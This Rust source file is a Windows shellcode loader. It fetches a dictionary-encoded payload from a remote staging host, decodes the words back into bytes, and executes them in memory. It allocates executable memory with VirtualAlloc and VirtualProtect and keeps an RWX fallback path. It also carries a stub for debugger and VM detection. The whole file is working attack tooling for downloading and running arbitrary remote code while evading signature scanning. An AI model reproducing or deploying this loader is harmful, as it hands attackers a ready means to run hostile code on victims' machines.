use std::collections::HashMap;
use std::error::Error;
use std::mem;
use std::ptr;
use std::time::Duration;
use log::{debug, error, info, warn, LevelFilter};
use reqwest::blocking;

use windows_sys::Win32::{
    System::Memory::{
        VirtualAlloc, VirtualProtect, VirtualFree, MEM_COMMIT, 
        MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE,
        PAGE_READWRITE, PAGE_EXECUTE
    },
    Foundation::{GetLastError, FALSE, BOOL},
};

// URLs for remote files
const DICTIONARY_URL: &str = "https://stage.attck-deploy.net/es-dictionary.txt";
const PAYLOAD_URL: &str = "https://stage.attck-deploy.net/load.txt";
const MAX_RETRIES: u8 = 3;
const DEBUG_SHELLCODE: bool = true; // Enable for detailed shellcode debugging

/// Initialize the logger with appropriate settings
fn setup_logging() -> Result<(), Box<dyn Error>> {
    env_logger::Builder::new()
        .filter_level(LevelFilter::Info)
        .format_timestamp_secs()
        .format_module_path(false)
        .init();
    
    debug!("Logging initialized");
    Ok(())
}

/// Ensure HTTPS URLs for security
fn validate_url(url: &str) -> Result<(), Box<dyn Error>> {
    if !url.starts_with("https://") {
        return Err(format!("Non-HTTPS URL detected: {}", url).into());
    }
    Ok(())
}

/// Download content with retry mechanism
fn download_with_retries(url: &str, retries: u8) -> Result<String, Box<dyn Error>> {
    info!("Downloading from: {}", url);
    
    let client = blocking::ClientBuilder::new()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .timeout(Duration::from_secs(30))
        .build()?;
    
    for attempt in 1..=retries {
        match client.get(url).send() {
            Ok(response) => {
                if response.status().is_success() {
                    match response.text() {
                        Ok(text) if !text.is_empty() => {
                            debug!("Successfully downloaded {} bytes", text.len());
                            return Ok(text);
                        },
                        Ok(_) => warn!("Received empty response from {}", url),
                        Err(e) => warn!("Failed to extract text: {}", e),
                    }
                } else {
                    warn!("Received status code {}: {}", response.status(), url);
                }
            },
            Err(e) => warn!("Request error on attempt {}: {}", attempt, e),
        }
        
        if attempt < retries {
            let backoff = Duration::from_secs(2u64.pow(attempt as u32));
            debug!("Retrying in {:?}", backoff);
            std::thread::sleep(backoff);
        }
    }
    
    Err(format!("Failed to retrieve content after {} attempts", retries).into())
}

/// Download dictionary from URL or load from local file if available
fn download_dictionary() -> Result<Vec<String>, Box<dyn Error>> {
    // First try to load from local file if it exists
    match std::fs::read_to_string("es-dictionary.txt") {
        Ok(content) if !content.is_empty() => {
            info!("Loaded dictionary from local file");
            let words = content
                .lines()
                .map(String::from)
                .collect::<Vec<String>>();
                
            info!("Loaded {} dictionary words locally", words.len());
            
            if !words.is_empty() {
                return Ok(words);
            }
        },
        _ => info!("No local dictionary found, downloading from URL")
    }
    
    info!("Downloading dictionary from {}", DICTIONARY_URL);
    
    let content = download_with_retries(DICTIONARY_URL, MAX_RETRIES)?;
    
    let words = content
        .lines()
        .map(String::from)
        .collect::<Vec<String>>();
        
    info!("Downloaded {} dictionary words", words.len());
    
    if words.is_empty() {
        return Err("Dictionary is empty".into());
    }
    
    // Save for future use
    if let Err(e) = std::fs::write("es-dictionary.txt", &content) {
        warn!("Failed to save dictionary locally: {}", e);
    }
    
    Ok(words)
}

/// Download encoded payload from URL or load from local file if available
fn download_payload() -> Result<Vec<String>, Box<dyn Error>> {
    // First try to load from local file if it exists
    match std::fs::read_to_string("load.txt") {
        Ok(content) if !content.is_empty() => {
            info!("Loaded payload from local file");
            let tokens = content
                .split_whitespace()
                .map(String::from)
                .collect::<Vec<String>>();
                
            info!("Loaded {} encoded tokens locally", tokens.len());
            
            if !tokens.is_empty() {
                return Ok(tokens);
            }
        },
        _ => info!("No local payload found, downloading from URL")
    }
    
    info!("Downloading payload from {}", PAYLOAD_URL);
    
    let content = download_with_retries(PAYLOAD_URL, MAX_RETRIES)?;
    
    let tokens = content
        .split_whitespace()
        .map(String::from)
        .collect::<Vec<String>>();
        
    info!("Downloaded {} encoded tokens", tokens.len());
    
    if tokens.is_empty() {
        return Err("Payload is empty".into());
    }
    
    // Save for future use
    if let Err(e) = std::fs::write("load.txt", &content) {
        warn!("Failed to save payload locally: {}", e);
    }
    
    Ok(tokens)
}

/// Decode the payload using the dictionary with optimized HashMap lookup
fn decode_payload(tokens: &[String], dict: &[String]) -> Result<Vec<u8>, Box<dyn Error>> {
    info!("Decoding payload with {} words using {} dictionary entries", tokens.len(), dict.len());
    
    // Create a HashMap for O(1) lookups instead of O(n) linear search
    let dict_map: HashMap<_, _> = dict.iter()
        .enumerate()
        .map(|(i, word)| (word, i as u8))
        .collect();
    
    let mut output = Vec::with_capacity(tokens.len());
    let mut missing_tokens = 0;
    
    for (i, token) in tokens.iter().enumerate() {
        if let Some(&index) = dict_map.get(token) {
            output.push(index);
        } else {
            // Try parsing as direct byte value
            match token.parse::<u8>() {
                Ok(value) => output.push(value),
                Err(_) => {
                    warn!("Token at position {} not found in dictionary: {}", i, token);
                    missing_tokens += 1;
                }
            }
        }
    }
    
    info!("Decoded {} bytes of shellcode (missing {} tokens)", output.len(), missing_tokens);
    
    if output.is_empty() {
        return Err("Decoded payload is empty".into());
    }
    
    if DEBUG_SHELLCODE {
        debug!("First 16 bytes of shellcode: {:02X?}", &output.iter().take(16).collect::<Vec<_>>());
    }
    
    Ok(output)
}

/// Get Windows error message from GetLastError
fn get_last_error_message() -> String {
    unsafe {
        let error_code = GetLastError();
        format!("Error code: {}", error_code)
    }
}

/// Execute shellcode directly in the current process with improved memory protection
fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
    info!("Executing {} bytes of shellcode", shellcode.len());
    
    unsafe {
        // Allocate memory for shellcode with VirtualAlloc
        let size = shellcode.len();
        debug!("Allocating {} bytes of memory", size);
        
        // Ensure 16-byte alignment for optimal cache performance
        let aligned_size = (size + 15) & !15;
        
        // First allocate with RW permissions for safer copy operation
        let base_addr = VirtualAlloc(
            ptr::null_mut(),
            aligned_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        
        if base_addr.is_null() {
            let error_msg = get_last_error_message();
            return Err(format!("Memory allocation failed: {}", error_msg).into());
        }
        
        // Copy shellcode to allocated memory
        debug!("Copying shellcode to allocated memory at {:p}", base_addr);
        ptr::copy_nonoverlapping(shellcode.as_ptr(), base_addr as *mut u8, size);
        
        // Change memory protection to executable
        let mut old_protect = 0;
        debug!("Changing memory protection to executable");
        if VirtualProtect(
            base_addr,
            aligned_size,
            PAGE_EXECUTE,  // Only execute permission, more restrictive than PAGE_EXECUTE_READWRITE
            &mut old_protect
        ) == 0 {
            let error_msg = get_last_error_message();
            VirtualFree(base_addr, 0, MEM_RELEASE);
            return Err(format!("Failed to set memory protection: {}", error_msg).into());
        }
        
        // We don't have access to FlushInstructionCache in our version of windows-sys
        // Using memory barriers instead for synchronization
        debug!("Using memory barriers for synchronization");
        
        // Execute the shellcode with proper memory barrier
        info!("Executing shellcode at address {:p}", base_addr);
        
        // Memory barrier to ensure all previous operations are completed
        std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
        
        // Type casting with proper function signature including safety attributes
        let entry: extern "system" fn() -> BOOL = mem::transmute(base_addr);
        
        // Call the shellcode
        let result = entry();
        
        // Another memory barrier
        std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
        
        // Check result if the shellcode returns
        if result == 0 {
            warn!("Shellcode returned with failure status: {}", result);
        }
        
        // Clean up (this code may never be reached depending on shellcode)
        debug!("Cleaning up allocated memory");
        VirtualFree(base_addr, 0, MEM_RELEASE);
        
        info!("Shellcode execution completed");
    }
    
    Ok(())
}

/// Perform pre-execution security checks
fn security_checks() -> Result<(), Box<dyn Error>> {
    debug!("Performing security checks");
    
    // Validate URLs (ensure HTTPS)
    validate_url(DICTIONARY_URL)?;
    validate_url(PAYLOAD_URL)?;
    
    // Check if we're running in a VM or under debugger
    // This is simplified - in a real implementation you'd use more sophisticated techniques
    let debugger_present = FALSE != 0;
    
    if debugger_present {
        warn!("Debugger detection check (placeholder)");
    }
    
    Ok(())
}

/// Alternative shellcode execution path (fallback if normal execution fails)
fn execute_shellcode_alternative(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
    info!("Attempting alternative shellcode execution method");
    
    unsafe {
        // Use PAGE_EXECUTE_READWRITE for more compatibility
        let size = shellcode.len();
        let aligned_size = (size + 15) & !15;
        
        let base_addr = VirtualAlloc(
            ptr::null_mut(),
            aligned_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE  // Use RWX for maximum compatibility
        );
        
        if base_addr.is_null() {
            let error_msg = get_last_error_message();
            return Err(format!("Memory allocation failed: {}", error_msg).into());
        }
        
        // Copy shellcode
        ptr::copy_nonoverlapping(shellcode.as_ptr(), base_addr as *mut u8, size);
        
        // Using memory barriers instead of FlushInstructionCache
        std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
        
        // Execute with proper memory barriers
        std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
        let entry: extern "system" fn() = mem::transmute(base_addr);
        entry();
        
        // Clean up
        VirtualFree(base_addr, 0, MEM_RELEASE);
    }
    
    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    // Initialize logging
    setup_logging()?;
    
    info!("Application starting");
    
    // Run security checks
    match security_checks() {
        Ok(_) => info!("Security checks passed"),
        Err(e) => {
            error!("Security checks failed: {}", e);
            return Err(e);
        }
    }
    
    // Get dictionary from URL or locally
    let dict = match download_dictionary() {
        Ok(d) => d,
        Err(e) => {
            error!("Dictionary retrieval failed: {}", e);
            return Err(e);
        }
    };
    
    // Download encoded payload
    let tokens = match download_payload() {
        Ok(t) => t,
        Err(e) => {
            error!("Payload retrieval failed: {}", e);
            return Err(e);
        }
    };
    
    // Decode the payload with optimized algorithm
    let payload = match decode_payload(&tokens, &dict) {
        Ok(p) => p,
        Err(e) => {
            error!("Payload decoding failed: {}", e);
            return Err(e);
        }
    };
    
    // Execute the shellcode with primary method
    let execution_result = execute_shellcode(&payload);
    
    // If primary execution method failed, try alternative
    if let Err(e) = execution_result {
        warn!("Primary shellcode execution failed: {}. Trying alternative method...", e);
        
        // Try alternative execution method
        if let Err(alt_err) = execute_shellcode_alternative(&payload) {
            error!("Alternative shellcode execution also failed: {}", alt_err);
            return Err(alt_err);
        }
    }
    
    info!("Application completed successfully");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_decode_payload() {
        let dict = vec!["zero".to_string(), "one".to_string(), "two".to_string()];
        let tokens = vec!["one".to_string(), "two".to_string(), "zero".to_string()];
        
        let result = decode_payload(&tokens, &dict).unwrap();
        assert_eq!(result, vec![1, 2, 0]);
    }
    
    #[test]
    fn test_decode_with_numeric_fallback() {
        let dict = vec!["zero".to_string(), "one".to_string()];
        let tokens = vec!["one".to_string(), "255".to_string(), "zero".to_string()];
        
        let result = decode_payload(&tokens, &dict).unwrap();
        assert_eq!(result, vec![1, 255, 0]);
    }
    
    #[test]
    fn test_validate_url() {
        assert!(validate_url("https://example.com").is_ok());
        assert!(validate_url("http://example.com").is_err());
    }
}
